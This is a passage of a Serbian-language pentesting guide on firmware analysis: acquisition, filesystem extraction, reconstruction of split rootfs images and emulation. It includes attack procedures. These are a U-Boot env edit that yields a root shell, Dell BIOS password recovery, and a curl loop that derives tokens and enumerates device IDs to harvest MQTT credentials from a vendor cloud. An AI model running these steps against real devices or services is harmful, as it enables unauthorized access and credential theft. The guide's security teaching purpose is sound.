# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

Za pribavljanje podataka preko izloženih hardverskih interfejsa pogledajte [izvlačenje firmvera uz pomoć UART konzole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [izvlačenje podataka sa SPI flash memorije](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Za ponovljivo UART snimanje tokom pokretanja, pre pristupa konzoli, pogledajte [napajanje kontrolisano pomoću SCPI-ja i prikupljanje podataka osciloskopom](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava ispravan rad uređaja tako što upravlja komunikacijom između hardverskih komponenti i softvera s kojim korisnici rade. Čuva se u trajnoj memoriji, pa uređaj može da pristupi važnim instrukcijama čim se uključi, što dovodi do pokretanja operativnog sistema. Analiza i potencijalno menjanje firmvera ključni su koraci u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloadera
- Rasporedu hardvera i tehničkim listovima
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i tipovima licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i otkrivenim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su neprocenjivi, kao i analiza svih dostupnih open-source softverskih komponenti pomoću ručnih i automatizovanih procesa pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može koristiti za pronalaženje potencijalnih problema.

## **Pribavljanje firmvera**

Firmver se može pribaviti na različite načine, od kojih svaki ima svoj nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** prema dostavljenim uputstvima
- **Preuzimanjem** sa zvaničnih stranica za podršku
- Korišćenjem upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktnim pristupom **skladištu u oblaku**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Izvlačenjem** iz uređaja preko veza kao što su **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ili **PICit**
- **Njuškanjem** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženjem i korišćenjem **hardkodiranih krajnjih tačaka za ažuriranje**
- **Izvlačenjem** podataka iz bootloadera ili preko mreže
- **Uklanjanjem i čitanjem** memorijskog čipa odgovarajućim hardverskim alatima, kada ništa drugo ne uspe

### Samo UART logovi: prisilno pokretanje root shell-a pomoću U-Boot okruženja u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete prisilno pokrenuti init shell tako što ćete **izmeniti U-Boot environment blob** van uređaja:<sup>[[6]](#references)</sup>

1. Izvucite SPI flash pomoću SOIC-8 klipse i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima na kojima je shell bootloader-a onemogućen, ali se env particiji može pristupiti preko eksternog flash-a.

## Analiza firmvera

Sada kada **imate firmver**, potrebno je da izdvojite informacije o njemu kako biste znali kako da ga obradite. Za to možete koristiti različite alate:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću komande `binwalk -E <bin>`. Ako je entropija niska, slika verovatno nije šifrovana. Ako je visoka, verovatno jeste šifrovana (ili komprimovana na neki način).

Pored toga, pomoću ovih alata možete izdvojiti **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili upotrebite [**binvis.io**](https://binvis.io/#/) ([kod](https://code.google.com/archive/p/binvis/)) da biste pregledali datoteku.

### Neobrađeni resursi za prikaz na eksternom flešu

Eksterni SPI dump nije nužno izvršni firmware MCU-a. Za Cortex-M metu, uporedite početak svakog mogućeg regiona koda sa memorijskom mapom uređaja: uobičajena tabela vektora počinje verovatnim pokazivačem steka u SRAM-u i adresom reset rukovaoca u izvršivoj memoriji. Odsustvo tabele vektora na pomeraju nula samo po sebi ne dokazuje da ceo čip nema kod; pregledajte i druge pomeraje i način pokretanja. Ako `binwalk` ne pronađe kontejner, pregledajte neobrađene bajtove i povežite adrese čitanja fleša iz [dekodiranog SPI snimka](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) sa radnjama koje učitavaju nove ekrane.<sup>[[14]](#references)</sup>

Za region sa resursima za prikaz, isprobajte moguće formate piksela i dimenzije umesto da pretpostavite da je reč o PNG/JPEG-u. Uređaj opisan u izvoru koristio je frejmove formata **80×160 RGB565 little-endian**: sa dva bajta po pikselu, veličina frejma je **25.600 bajtova** (25 KiB), a ne 24 kilobita. Adresa čitanja dekodiranog fleša otkrila je pomeraj resursa za ekran; istraživač je konvertovao pripremljenu sliku komandom `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zamenio resurs iste veličine u originalnom dump-u, upisao ga komandom `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potvrdio da se nova slika prikazuje na ekranu. Ovo demonstrira upisive *eksterne resurse za prikaz*, a ne izdvajanje ili ponovno flešovanje internog firmware-a MCU-a. Sačuvajte originalni dump i proverite dimenzije, redosled bajtova, pomeraj i dužinu zamenskog resursa pre upisa.<sup>[[14]](#references)</sup>

### Diferencijalna analiza fleša i povrativi XOR skladišta tajni

Kada format skladištenja neke postavke firmware-a nije dokumentovan, prvo napravite nekoliko čitanja fleša u istim uslovima, promenite **tačno jednu** postavku, ponovo napravite dump celog čipa i uporedite pomeraje. Ponavljanjem eksperimenta sa kontrolisanim vrednostima možete razlikovati postavku od brojača i metapodataka o upisu; promene na novim pomerajima umesto na istim ukazuju na skladište koje podržava samo dodavanje ili je organizovano kao dnevnik. Sačuvajte obrisane/unakrsno označene unose jer njihovi bajtovi sa sadržajem možda i dalje mogu da se povrate.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon što locirate region, izdvojite module firmware-a pomoću alata kao što je `binwalk` i analizirajte writer/validator u Ghidra. Potvrdite granice polja, padding, indeksiranje ključa i izvođenje ključa u kodu, umesto da šemu zaključujete samo na osnovu obrazaca šifrata.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovane nulte dopune

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove toka ključa na istim pomerajima. Polje fiksne veličine posebno je izloženo kada se njegova nulta dopuna prostire preko svih indeksa ponavljajućeg XOR ključa: šifrovana dopuna direktno otkriva te bajtove ključa, jer je `0x00 XOR key_byte = key_byte`. Ako su obuhvaćeni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifrata i dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Dell-ov ranjivi format DVAR BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je u otvorenom tekstu, dok se za bajtove `1..31` koristi ponavljajući ključ od 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nule pre XOR-a. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, pa se ceo ključ i lozinka mogu oporaviti bez brute force-a:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvucite ključeve iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini unos koji zavisi od lozinke jeste njen prvi bajt u čistom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele ključ. Grupirajte aktivne i obrisane zapise prema tom bajtu; kratak istorijski zapis može da otkrije ceo ključ preko paddinga i dešifruje trenutni, duži zapis čiji padding nije dovoljan. Zato rotacija lozinke može povećati izloženost ako se stari šifrat samo označi za brisanje, umesto da se obriše.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava zapise kandidata, oporavlja lozinke i može da prikaže neobrađene bajtove sačuvanih podataka/ključa. Izgradite ga iz checkout-a i skenirajte proverenu flash sliku ovako:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parsere odbacujte lažno pozitivne rezultate proverom strukture zapisa, ograničenja štampivih znakova, dopune nulama, entropije ključa i konzistentnosti na mestu gde se ključ prelama. Ako ponovljeni dump-ovi pokazuju retke promene bitova pri svakom upisu, popišite uočene maske i rangirajte korekcije prema ovim ograničenjima, ali prijavite nejasne znakove umesto da heuristički rezultat predstavljate kao tačno rekonstruisan.<sup>[[12]](#references)</sup>

Verifikatori lozinki treba da čuvaju posoljeni, iterirani jednosmerni hash, a ne reverzibilni šifrat, dok skladišta strukturisana kao log treba bezbedno da uklone prevaziđeni tajni materijal.<sup>[[12]](#references)</sup>

### Dobavljanje fajl sistema

Pomoću prethodno navedenih komentiranih alata, kao što je `binwalk -ev <bin>`, trebalo je da možete da **izdvojite fajl sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu po tipu fajl sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl sistema

Ponekad binwalk **nema magični bajt fajl sistema u svojim potpisima**. U tim slučajevima koristite binwalk da **pronađete pomeraj fajl sistema i izdvojite kompresovani fajl sistem** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu s tipom, koristeći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs fajl-sistema.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u primeru iznad)

`$ unsquashfs dir.squashfs`

Datoteke će se zatim nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstrukcija podeljenih ugrađenih root sistema datoteka

Ako raw eMMC/SSD dump sadrži ispravno zaglavlje sistema datoteka, ali se njegovi pomeraji metapodataka protežu izvan nominalne particije, nemojte ga odmah označiti kao oštećen. Ugrađeni kod za pokretanje može sastaviti stvarni root uređaj iz više fizičkih opsega pomoću Device Mapper-a, pa carving jedne GPT particije daje samo prvi segment.<sup>[[9]](#references)</sup>

#### Provera kompletne slike medijuma

Najpre proverite da li je pribavljanje završeno, da li je veličina stabilna i da li neki proces i dalje drži image otvorenim za pisanje. Ako naziv datoteke sadrži početnu/krajnju adresu, uporedite taj opseg sa stvarnim brojem bajtova. Oporavite GPT u režimu samo za čitanje i prikačite samo potreban opseg; nemojte pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici jer su mogući konflikti grupa volumena i nenamerna upisivanja.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferirajte disposable VM kada originalna init logika ili LVM stek moraju da vide celu sliku. Istorijski zapisi pokretanja sa standardne boot particije posebno su korisni: bootloader je možda zabeležio pomeraje vlasničkog kontejnera, dužine komponenti, izbor slota, pravila poravnanja i verifikaciju potpisa. Koristite te vrednosti da izdvojite ugrađenu komandnu liniju/kernel/initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, bajtova potpisa i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Vratite mapu blokova pri pokretanju

Izdvojite initramfs kernela i analizirajte njegov `/init` i sve biblioteke za skladištenje podataka. U [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), pratite reference stringova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i gradi tabelu. Korisne početne tačke za rad sa radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cilj linear mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više pozadinskih uređaja. Oporavljena tabela sa dva segmenta obično ima sledeći oblik (sve pozicije i dužine su u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Tačno reprodukujte aritmetiku mašinskog koda, uključujući širinu celih brojeva, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže na granicu od 4 KiB i tek onda je konvertuje u sektore od 512 bajtova; zamena izrazom `p4_bytes // 512` pomera izabrani završni deo za `p4_bytes % 4096` kad god particija nije poravnata na granicu stranice.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstrušite ravnu analitičku sliku kopiranjem opsega redosledom iz tabele, koristeći ograničene blokove umesto učitavanja kompletnog dump-a medija u memoriju. Time se izbegava i kreiranje host-side mapper uređaja. Zadržite GPT izvedene ofsete, obrnute brojeve sektora i dužinu izlaznog fajla kao zasebne tvrdnje.<sup>[[9]](#references)</sup>

#### Razlikujte oštećenje od konstantne greške u rekonstrukciji

Kod SquashFS-a proverite `hsqs` magic vrednost i dekodirajte little-endian 64-bitno polje `bytes_used` na ofsetu 40 u superbloku pre pokretanja `unsquashfs`. Ako izdvajanje ne uspe u nekoliko nepovezanih struktura, pretražite širok opseg oko očekivanih pozicija i zahtevajte snažne strukturne kandidate: blok metapodataka koji može da se dekompresuje, nekoliko uzastopnih ispravnih unosa direktorijuma, verovatna inode polja, root inode koji je u skladu sa brojem inode-ova ili ispravnu strukturu metapodataka integriteta. Jedno poklapanje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada isti potpisani pomak učini validnim nezavisne strukture — na primer, metapodatke direktorijuma i verity zapis — verovatni uzrok je sistematska greška u početku segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na granicu sektora/stranice pre nego što pokušate oporavak napuštenih datoteka ili zakrpljivanje metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, držite granice zaštite odvojeno: LUKS volumeni čiji je ključ zapečaćen TPM-om štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet osnovnog sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen za originalni fizički TPM, a pokretanje izmenjenog SquashFS-a kroz init namenjen samo istraživanju, koji izostavlja verity proveru, ne falsifikuje njegov potpis niti narušava dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware-a

Kada se firmware pribavi, neophodno je analizirati ga da bi se razumeli njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje vrednih podataka iz slike firmware-a.

### Alati za početnu analizu

Za početni pregled binarne datoteke (označene kao `<bin>`) naveden je skup komandi. One pomažu u određivanju tipa datoteke, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenio status šifrovanja slike, proverava se **entropija** pomoću komande `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo šifrovanja, dok visoka entropija ukazuje na moguće šifrovanje ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje sistema datoteka

Komandom `binwalk -ev <bin>` obično se može izdvojiti sistem datoteka, najčešće u direktorijum nazvan po tipu sistema datoteka (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip sistema datoteka zbog nedostajućih magičnih bajtova, potrebno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` komande za pronalaženje pomeraja sistema datoteka, a zatim komande `dd` za izdvajanje sistema datoteka:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga, u zavisnosti od tipa sistema datoteka (npr. squashfs, cpio, jffs2, ubifs), za ručno izdvajanje sadržaja koriste se različite komande.

### Analiza sistema datoteka

Kada se sistem datoteka izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se usmerava na nebezbedne mrežne demone, hardkodovane kredencijale, API endpoint-e, funkcionalnosti servera za ažuriranje, nekompajlirani kod, skripte za pokretanje i kompajlirane binarne datoteke koje se analiziraju offline.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke zbog mogućih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene veb servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti u sistemu datoteka:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmvera
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

I izvorni kod i kompajlirane binarne datoteke pronađene u sistemu datoteka moraju se pažljivo pregledati zbog ranjivosti. Alati kao što je **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u otkrivanju nezaštićenih binarnih datoteka koje bi mogle da se iskoriste.

## Prikupljanje konfiguracije u oblaku i MQTT kredencijala pomoću tokena izvedenih iz URL-a

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmvera možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao heksadecimalni zapis velikim slovima

Ovakvo rešenje omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme konfiguraciju iz oblaka, čime se često otkrivaju MQTT kredencijali u običnom tekstu i prefiksi tema.

Praktični postupak:

1) Izdvojite deviceId iz UART zapisa pri pokretanju

- Povežite UART adapter od 3.3V (TX/RX/GND) i zabeležite izlaz:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a za cloud konfiguraciju i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavite STATIC_KEY i algoritam tokena iz firmvera

- Učitajte binarne fajlove u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izračunajte token u Bash-u i pretvorite digest u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl-a; parsirajte ga pomoću jq-a da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotrebite MQTT u otvorenom tekstu i slabe ACL-ove tema (ako postoje)

- Koristite pronađene akreditive da biste se pretplatili na teme održavanja i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumeriši predvidljive ID-jeve uređaja (u velikom obimu, uz ovlašćenje)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja proizvođača/proizvoda/tipa, iza kojih sledi sekvencijalni sufiks.
- Možeš programski da iteriraš kroz potencijalne ID-jeve, izvodiš tokene i preuzimaš konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovne enumeracije.
- Kada je moguće, dajte prednost emulaciji ili statičkoj analizi za otkrivanje tajni, bez izmena ciljnog hardvera.

Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prebacivanje korenskog sistema datoteka ili konkretnih binarnih datoteka na uređaj sa odgovarajućom arhitekturom i redosledom bajtova, kao što je Raspberry Pi, ili na unapred napravljenu virtuelnu mašinu, može olakšati dalja testiranja.

### Emulacija pojedinačnih binarnih datoteka

Pri ispitivanju pojedinačnih programa, ključno je utvrditi redosled bajtova i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

I da biste instalirali neophodne alate za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući postupak i olakšavajući dinamičku analizu.

### Rekonstrukcija podeljenih i verifikovanih root datotečnih sistema za emulaciju

Ako je superblok SquashFS-a čitljiv, ali su pomeraji inode-a, direktorijuma ili tabele fragmenata nemogući, nemojte odmah menjati `unsquashfs`. Obrnutim inženjeringom analizirajte ranu boot binarnu datoteku i reprodukujte graf blok-uređaja koji ona kreira: ugrađeni sistemi mogu izložiti nominalnu root particiju, ali stvarni datotečni sistem formirati pomoću mapiranja `dm-linear` koje dodaje sektore pozajmljene iz druge particije. Provere koje obuhvataju samo superblok mogu proći čak i kada su svi kasniji blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Sačuvajte aritmetiku firmware-a tačno onakvom kakva jeste. Naročito utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja bitova i skraćivanje prvobitnim redosledom; i uzmite u obzir završne oblasti koje zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre skraćuje vrednost na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena izrazom `partition_bytes // 512` može pomeriti dodati opseg za nekoliko kilobajta i oštetiti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Koristan postupak validacije je:<sup>[[11]](#references)</sup>

1. Iz binarne datoteke verifier/init utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite ili mapirajte opsege bez menjanja njihove semantike poravnanja.
3. Ako izdvajanje i dalje ne uspe, pretražite samo mali opseg oko predviđene granice i zahtevajte nekoliko uzastopnih validnih struktura metapodataka, umesto da prihvatite samo naizgled ispravan superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešan prolazak kroz sve direktorijume i fragmente jači je dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity sistema kojom upravlja analitičar

Kada analitičar upravlja QEMU jezgrom, initramfs-om i virtuelnim diskovima, izmenjeni root sistem može da se pokrene zamenom vendor-ovog PID 1 procesa za verifikaciju malim statički povezanim init-om. Ovo je **zamena boot lanca u laboratorijskom okruženju**, a ne zaobilaženje dm-verity-ja, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog TPM-om.<sup>[[11]](#references)</sup>

Zamenski init treba da preslika operativne delove prvobitne putanje pokretanja: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, sačeka dostavljeni blok-uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-datotečne sisteme starog root-a, premesti novo montiranje na `/`, izvrši `chroot` i pokrene firmware-ov originalni `/sbin/init` pomoću `execve()`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk montiran samo za čitanje obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugovanje stanja slike van mreže

